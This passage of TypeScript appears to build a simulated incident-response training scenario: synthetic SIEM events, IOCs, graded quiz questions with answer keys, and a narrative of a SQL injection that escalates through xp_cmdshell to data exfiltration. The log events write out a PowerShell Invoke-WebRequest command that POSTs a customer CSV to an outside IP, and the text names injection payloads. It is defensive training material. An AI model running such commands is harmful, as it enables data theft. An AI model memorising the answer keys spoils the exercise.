      desc: "Guardium recorded xp_cmdshell running a PowerShell Invoke-WebRequest POST of C:\\Windows\\Temp\\c.csv to http://45.83.192.11/u on login app_shop.",
    }),
    sysmonProcess({
      ...hostCtx, id: "sqli_09a_host_cmd_powershell", ts: T(13 * MIN + 1 * SEC),
      processName: "cmd.exe", processPath: CMDPATH,
      cmdline: "cmd.exe /c powershell -c \"Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"",
      pid: 6290, ...sqlParent, sha256: cmdHash, signed: true, integrity: "System", runAsUser: SQLSVC, mitre: "T1059.003", tactic: "Execution", severity: "high",
      description: "Sysmon 1 on MSSQL-SHOP-01: sqlservr.exe started cmd.exe /c powershell ... Invoke-WebRequest.",
    }),
    sysmonProcess({
      ...hostCtx, id: "sqli_09b_host_powershell", ts: T(13 * MIN + 2 * SEC),
      processName: "powershell.exe", processPath: PSPATH,
      cmdline: "powershell -c \"Invoke-WebRequest -Uri http://45.83.192.11/u -Method POST -InFile C:\\Windows\\Temp\\c.csv\"",
      pid: 6340, parentName: "cmd.exe", parentPath: CMDPATH, parentPid: 6290,
      sha256: psHash, signed: true, integrity: "System", runAsUser: SQLSVC, mitre: "T1059.001", tactic: "Execution", severity: "high",
      description: "Sysmon 1 on MSSQL-SHOP-01: cmd.exe started powershell.exe with an Invoke-WebRequest POST of c.csv.",
    }),
    {
      ...sysmonNetwork({
      ...hostCtx, id: "sqli_09c_host_connect", ts: T(13 * MIN + 4 * SEC),
      processName: "powershell.exe", processPath: PSPATH, pid: 6340, remoteIp: exfilIp, remotePort: 80,
      mitre: "T1567", tactic: "Exfiltration", severity: "high",
      description: "Sysmon 3 on MSSQL-SHOP-01: powershell.exe connected to 45.83.192.11:80.",
      }),
      process: { name: "powershell.exe", pid: 6340, path: PSPATH, parent_name: "cmd.exe", parent_pid: 6290, user: SQLSVC },
    },
    {
      id: "sqli_09d_fw_egress", ts: T(13 * MIN + 16 * SEC),
      source: "firewall", vendor: "Palo Alto Networks PAN-OS", event_type: "net_connection",
      hostname: "FW-DMZ-01", src_ip: dbIp, dst_ip: exfilIp, src_port: 50322, dst_port: 80, protocol: "tcp",
      severity: "high", mitre_technique: "T1567", mitre_tactic: "Exfiltration", incident_id: INCIDENT,
      network: { bytes_out: 41_562_144, bytes_in: 612 },
      description: "FW-DMZ-01 allowed tcp/80 from MSSQL-SHOP-01 (10.30.5.20) to 45.83.192.11, 41,562,144 bytes sent, rule Servers-Egress-Any.",
      raw: {
        "pan.type": "TRAFFIC",
        "pan.subtype": "end",
        "pan.action": "allow",
        "pan.rule": "Servers-Egress-Any",
        "pan.from_zone": "db-tier",
        "pan.to_zone": "untrust",
        "pan.src": dbIp,
        "pan.dst": exfilIp,
        "pan.sport": "50322",
        "pan.dport": "80",
        "pan.app": "web-browsing",
        "pan.bytes_sent": "41562144",
        "pan.bytes_received": "612",
        "pan.elapsed_time": "12",
        "pan.session_end_reason": "tcp-fin",
        "action_result": "allow",
      },
    },
  ];

  const iocs: IOC[] = [
    {
      type: "ip",
      value: attackerIp, // 194.36.191.47, the injection source seen at the WAF
      first_seen: T(0),
      last_seen: T(12 * MIN + 58 * SEC),
      reputation: "malicious",
      tags: ["external", "waf-source"],
    },
    {
      type: "ip",
      value: exfilIp, // 45.83.192.11, the outbound POST target
      first_seen: T(13 * MIN + 4 * SEC),
      last_seen: T(13 * MIN + 16 * SEC),
      reputation: "malicious",
      tags: ["external", "outbound-http-endpoint"],
    },
    {
      type: "host",
      value: app.host, // shop.nexacorp.com, the targeted storefront
      first_seen: T(0),
      last_seen: T(13 * MIN),
      reputation: "unknown",
      tags: ["internet-facing", "web-app", "victim"],
    },
    {
      type: "user",
      value: dbLogin, // app_shop, the over-privileged DB login the injection rides
      first_seen: T(5 * MIN),
      last_seen: T(13 * MIN),
      reputation: "suspicious",
      tags: ["db-login"],
    },
    {
      type: "sha256",
      value: dumpHash, // the staged customer CSV that was POSTed off-box
      first_seen: T(12 * MIN + 40 * SEC),
      last_seen: T(12 * MIN + 40 * SEC),
      reputation: "malicious",
      tags: ["file-hash", "c.csv"],
    },
  ];

  const questions: ScenarioQuestion[] = [
    {
      id: "sqli_q1",
      xp: 55,
      kind: "single",
      prompt:
        "The WAF blocked the ' OR 1=1 probe (sqli_01) with a 403, yet the very next UNION SELECT (sqli_02) came back HTTP 200 from the origin. What does the pair of WAF records actually tell you?",
      hint: "Compare action_result and http.response.status_code across the two events, and read the waf.policy.name on each.",
      options: [
        { value: "detect_mode", label: "The UNION rule matched but only alerted (action_result=alerted) under a staging policy in detection mode, so the request reached the app and ran" },
        { value: "waf_down", label: "The WAF failed open between the two requests, a crash or bypass meant the second payload reached the origin with no inspection or rule match" },
        { value: "encoded", label: "The second payload was double URL-encoded, so the signature engine could not normalise the payload and forwarded it to the origin with no signature match" },
        { value: "200_blocked", label: "An HTTP 200 on the WAF record means the WAF rewrote the request, stripping the injected SQL so only a sanitized query reached the DB" },
      ],
      answer: "detect_mode",
      explanation:
        "Both requests were seen and matched by Imperva, the difference is the enforcement mode. sqli_01 is action_result=blocked (imperva.action=Block) under the NexaCorp-Production policy (403, request stopped). sqli_02 is action_result=alerted (imperva.action=Alert) under the NexaCorp-Staging-DetectOnly policy with http.response.status_code=200: a rule in detection/count mode logs the match but forwards the request to the origin, which executed it. 'The WAF logged it' is not 'the WAF stopped it'. The WAF never crashed (it produced a normal alert record). The payload was not encoded away, the plaintext UNION SELECT is right there in url.query. And a 200 is the origin's own response to a request the WAF let through, not proof of sanitization.",
    },
    {
      id: "sqli_q2",
      xp: 70,
      kind: "single",
      prompt:
        "You are writing the incident up. A WAF SQLi alert on its own would be scored as an attempt. Which evidence proves customer data actually left the database rather than the injection merely being tried?",
      hint: "Look for a successful read of a real data table, with a row count and an independent corroboration.",
      options: [
        { value: "bulk_select", label: "The successful SELECT of dbo.Customers returning 248,915 rows, corroborated by SQL Server's own audit response_rows for the same statement" },
        { value: "union_schema", label: "The UNION query against INFORMATION_SCHEMA.COLUMNS that returned 612 rows mapping every table and column, showing the database was read out" },
        { value: "waf_alert", label: "The Imperva alert on the UNION SELECT, which recorded the injection reaching the origin with HTTP 200 and is the first proof of success" },
        { value: "convert_err", label: "The CONVERT() error whose SQL error 245 message leaked the Customers table name back to the caller, proving customer data came out of the DB" },
      ],
      answer: "bulk_select",
      explanation:
        "Data leaving is a successful read of real rows, not a probe. sqli_06 is a query.status=success product query with a UNION SELECT of dbo.Customers appended, query.rows_returned=248915 (email, password hash and card-last-four per row) and 41.5 MB of session.bytes, and sqli_07 is SQL Server's native audit of the identical statement with response_rows=248915 and succeeded=true, two independent records of the same bulk read. The UNION against INFORMATION_SCHEMA only enumerated the schema (structure, not customer rows). The WAF alert is what started the investigation but says nothing about what the query returned. And the CONVERT() error leaked a single table name, not the data itself.",
    },
    {
      id: "sqli_q3",
      xp: 65,
      kind: "single",
      prompt:
        "In every attack-related database event the db.user is app_shop from WEB-APP-02 (10.30.4.15), never the attacker's 194.36.191.47. How should that shape how you read the DAM logs?",
      hint: "Think about where SQL injection executes and whose session it borrows once it reaches the database.",
      options: [
        { value: "rides_app", label: "The injection runs inside the web app's own DB session, so DAM sees app_shop from the app tier; the real origin is upstream, tied in via WAF and app logs" },
        { value: "insider", label: "app_shop is a rogue database administrator logging in locally on the database server, so this is an insider incident and the WAF events are unrelated noise" },
        { value: "db_exposed", label: "The database is directly exposed to the internet, so 10.30.4.15 must be a NAT address fronting the attacker as they connect straight to the DB port" },
        { value: "spoofed", label: "The attacker forged the source address as 10.30.4.15 inside the injected TDS packets so the DB session would hide behind the trusted application server" },
      ],
      answer: "rides_app",
      explanation:
        "SQL injection executes through the vulnerable application, so the database sees the application's connection: db.user=app_shop, source WEB-APP-02 / 10.30.4.15, application '.Net SqlClient Data Provider'. The attacker's 194.36.191.47 never appears at the DB tier, it is upstream at the WAF. That is the whole reason DAM alone understates the source: you correlate by query content and timing across the WAF and app logs to place the real origin. app_shop is the application's service login, not a human DBA (no local interactive login exists). The DB is not internet-exposed, it is reached via the app. And a DAM source IP is the TCP peer (the app server), not a value the attacker can spoof through the injected string.",
    },
    {
      id: "sqli_q4",
      xp: 75,
      kind: "single",
      prompt:
        "Guardium shows sp_configure enabling 'xp_cmdshell' and then EXEC master..xp_cmdshell 'whoami' succeeding (sqli_08), and Sysmon on MSSQL-SHOP-01 shows sqlservr.exe starting cmd.exe /c whoami. What did the operator gain, and what made it possible?",
      hint: "Note the db.user.role on the login, and which process on the database host is the parent of cmd.exe.",
      options: [
        { value: "os_exec", label: "OS command execution on the DB host as the SQL Server service account, possible because app_shop held sysadmin, so it could enable and call xp_cmdshell" },
        { value: "sqli_only", label: "Nothing beyond the earlier injection, xp_cmdshell only returns result sets from the master database, so it is another way to read tables, not code execution" },
        { value: "priv_esc_win", label: "Local administrator on Windows through a kernel exploit that the RECONFIGURE statement triggers while it rebuilds the SQL Server service token" },
        { value: "new_login", label: "A new SQL login holding sysadmin, created by the sp_configure call, which is what then gave the injected session permission to run whoami" },
      ],
      answer: "os_exec",
      explanation:
        "xp_cmdshell runs an operating-system command from inside SQL Server, in the context of the SQL Server service account, here Sysmon shows sqlservr.exe starting cmd.exe /c whoami on MSSQL-SHOP-01 as NT Service\\MSSQLSERVER (T1059, Execution). Guardium sees only the SQL text; the processes come from the host. Enabling it requires sysadmin, and the log shows exactly that: db.user.role=sysadmin on app_shop, so the injection could run sp_configure to switch xp_cmdshell on and then call it. That an internet-facing app's DB login is sysadmin is the underlying misconfiguration. xp_cmdshell is not a table read, it is command execution. No kernel exploit is present; RECONFIGURE simply applies the sp_configure change. And sp_configure toggles server options, it does not create logins.",
    },
    {
      id: "sqli_q5",
      xp: 85,
      kind: "single",
      prompt:
        "You are scoping containment. Injection reached the DB through a detection-mode WAF rule, 248,915 customer records were read, exported to c.csv and POSTed to 45.83.192.11, and the app login is sysadmin. Which response matches the evidence?",
      hint: "Address the passthrough, the over-privilege, the OS-command path, the egress, and the confirmed data loss, not just the source IP.",
      options: [
        { value: "full_scope", label: "Set the Imperva SQLi rules to blocking, remove sysadmin from app_shop and rotate it, disable xp_cmdshell, block and hunt egress to 45.83.192.11, and treat the Customers PII as breached" },
        { value: "block_src", label: "Block 194.36.191.47 at the WAF and add its /24 to the deny list, cutting off the injecting source stops further queries and closes the incident without touching the DB" },
        { value: "reimage_web", label: "Reimage WEB-APP-02 and redeploy the storefront code, the injection came through the web tier, so rebuilding it removes the vulnerability and ends the data exposure" },
        { value: "reset_bi", label: "Reset the svc_powerbi account and revoke its reporting access, since the large customer read matches the same high-volume query pattern that service account runs nightly" },
      ],
      answer: "full_scope",
      explanation:
        "The evidence names each fix. The injection succeeded because the matching WAF rules were in detection mode, so they must go to blocking. app_shop being sysadmin is what enabled xp_cmdshell, so remove the role and rotate the credential, and disable xp_cmdshell. The dump was POSTed to 45.83.192.11, so block that egress and hunt for what else reached it. And because 248,915 real customer records (with password hashes and card-last-four) were successfully read and sent off-box, the PII must be handled as a confirmed breach for notification. Blocking only 194.36.191.47 leaves the detection-mode gap, the sysadmin login and xp_cmdshell in place for the next source. Reimaging the web server does not fix an over-privileged DB login or the WAF policy. And svc_powerbi is the benign control, a scheduled parameterized reporting read against a view, not the exfil path.",
    },
  ];

  return {
    scenario_id: scenarioId,
    title: "Imperva alerts on shop.nexacorp.com and unusual ShopDB reads",
    threat_actor: "External web attacker automating SQL injection against a public storefront",
    attack_kind: "sql_injection",
    briefing:
      "Imperva raised SQL-injection alerts against shop.nexacorp.com's /product/search endpoint from 194.36.191.47 late on 14 Jul, and the DB team saw unusual reads on ShopDB. Work out whether anything got past the WAF, what the database and its host actually did, and how much data is at risk.",
    narrative: `shop.nexacorp.com is Nexacorp's internet-facing storefront, fronted by an Imperva WAF. Just before 22:40 an attacker at 194.36.191.47 began probing the product-search endpoint with automated SQL injection. The first payload, a classic ' OR 1=1 tautology, was caught cleanly: Imperva's production security policy blocked it and returned HTTP 403. On a WAF dashboard alone the story could have ended there, as a blocked attempt.

It did not. The next two payloads, a UNION SELECT against information_schema.tables and an error-based CONVERT() extraction, matched Imperva signatures too, but those rules were sitting in a STAGING policy running in detection (count) mode. They alerted and then forwarded the requests to the origin, which answered HTTP 200. The malicious queries executed. This is the crux of the exercise: "the WAF logged it" is not "the WAF stopped it".

At the database, IBM Guardium recorded the injection arriving on the web application's own DB login, app_shop, from the web tier WEB-APP-02, the attacker's own address never reaches the DB, because injection runs inside the app's session. First an error-based CONVERT() failed with SQL error 245 and leaked a table name ('Customers') in its error text. Then a UNION dumped 612 rows from INFORMATION_SCHEMA.COLUMNS, mapping the schema. Then the payoff: an unparameterized SELECT of dbo.Customers returned 248,915 rows, email, password hashes, card-last-four, moving 41.5 MB in the session. SQL Server's own native audit independently logged the same statement with response_rows 248,915.

Because app_shop was misconfigured as sysadmin, the operator did not stop at reading. sp_configure turned on xp_cmdshell and EXEC master..xp_cmdshell 'whoami' made sqlservr.exe start cmd.exe on the database host (MSSQL-SHOP-01, 10.30.5.20) as the SQL Server service account: OS command execution reached straight from a web injection. At 22:52 xp_cmdshell ran bcp to export the customer table to C:\\Windows\\Temp\\c.csv (41.5 MB, sha256 on the Sysmon file record), and at 22:53 a new cmd.exe and PowerShell POSTed that file to the external host 45.83.192.11, which the data-centre firewall allowed on tcp/80. Every one of these requests was also logged by Imperva under the detection-mode staging policy. The benign comparison in the data is the 03:00 Power BI job: svc_powerbi returning 184,920 rows from a reporting view, the same "big database read" shape as the exfil, but a scheduled service account, parameterized, against a view, not the live PII table.`,
    learning_objectives: [
      "Distinguish a WAF that blocked an injection (action_result=blocked, 403) from one that only detected it (action_result=alerted, origin 200) and understand that a detection-mode rule still lets the attack through",
      "Follow SQL injection from the WAF layer into the database and read Guardium / SQL Server audit records, query.text, rows_returned, sql.error, response_rows, as the ground truth of what executed",
      "Prove data exfiltration from a bulk SELECT of a PII table with a high row count, rather than inferring impact from a WAF alert alone",
      "Recognise that injection executes inside the application's DB session (app_shop from the web tier), so the attacker's true origin must be correlated in from WAF and app logs",
      "Identify xp_cmdshell abuse enabled by an over-privileged sysadmin app login as the pivot from data theft to OS command execution and web-based exfiltration",
    ],
    alerts: [],
    events,
    iocs,
    killchain: [
      { ts: "2026-07-14T03:00:12.000Z", phase: "Baseline", action: `Scheduled Power BI read: ${biAccount} returns 184,920 rows from a reporting view on MSSQL-RPT-01, parameterized, authorized, the benign high-volume control` },
      { ts: T(0), phase: "Initial Access", action: `WAF BLOCKS ' OR 1=1 probe from ${attackerIp}, 403 under the production policy (T1190)` },
      { ts: T(3 * MIN), phase: "Initial Access", action: "UNION SELECT on information_schema.tables alerted-only under a detection-mode staging policy, origin answers 200, 181 rows returned at the database (T1190)" },
      { ts: T(5 * MIN), phase: "Initial Access", action: "Error-based CONVERT() extraction also passes through the detection-mode policy (T1190)" },
      { ts: T(5 * MIN + 4 * SEC), phase: "Discovery", action: `Guardium: CONVERT() fails (SQL error 245) on ${dbLogin} from ${app.webTier}, leaking a table name (T1190)` },
      { ts: T(6 * MIN), phase: "Discovery", action: "UNION dumps 612 rows from INFORMATION_SCHEMA.COLUMNS, full schema map (T1190)" },
      { ts: T(8 * MIN), phase: "Collection", action: "Product query with a UNION SELECT of dbo.Customers appended returns 248,915 PII rows (email, password hash, card-last-four) (T1213)" },
      { ts: T(8 * MIN + 1 * SEC), phase: "Collection", action: "SQL Server native audit corroborates the same statement, response_rows 248,915 (T1213)" },
      { ts: T(10 * MIN + 20 * SEC), phase: "Execution", action: `Stacked statements: sp_configure enables xp_cmdshell (app login is sysadmin) on ${dbInstance} (T1059)` },
      { ts: T(11 * MIN), phase: "Execution", action: `xp_cmdshell 'whoami': sqlservr.exe starts cmd.exe /c whoami on ${dbInstance} (${dbIp}) (T1059)` },
      { ts: T(12 * MIN + 4 * SEC), phase: "Collection", action: "xp_cmdshell runs bcp: dbo.Customers exported to C:\\Windows\\Temp\\c.csv (41.5 MB) (T1560)" },
      { ts: T(13 * MIN + 2 * SEC), phase: "Exfiltration", action: `New cmd.exe and powershell.exe POST c.csv to ${exfilIp}; the data-centre firewall allows tcp/80 and logs 41.5 MB out (T1567)` },
    ],
    questions,
  };
}
